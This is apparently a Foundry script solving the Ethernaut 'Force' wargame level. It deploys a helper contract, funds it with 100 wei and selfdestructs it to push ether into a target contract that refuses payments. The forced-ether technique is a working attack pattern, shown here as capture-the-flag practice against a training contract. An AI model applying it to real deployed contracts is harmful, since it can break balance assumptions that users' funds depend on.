/*
Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

Fallback methods
Sometimes the best way to attack a contract is with another contract.
See the "?" page above, section "Beyond the console"
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "src/Force.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ForceDestruct {
    Force public force;

    constructor(Force _force) {
        // Force contract'ını yok et
        force = _force;
    }

    fallback() external payable {}
    receive() external payable {}

    function attack() public {
        selfdestruct(payable(address(force)));
    }
}

contract ForceSolution is Script {
    Force public force = Force(0x329BaB14b645f7b5D89812F748f2B6453F3191F0);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Force contract balance before attack:", address(force).balance);
        ForceDestruct destructContract = new ForceDestruct(force);
        console.log("ForceDestruct contract balance before attack:", address(destructContract).balance);
        (bool success,) = address(destructContract).call{value: 100 wei}(""); // ✅ ETH gönder
        require(success, "ETH transfer failed");
        destructContract.attack();
        console.log("Force contract balance after attack:", address(force).balance);
        console.log("ForceDestruct contract balance after attack:", address(destructContract).balance);

        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
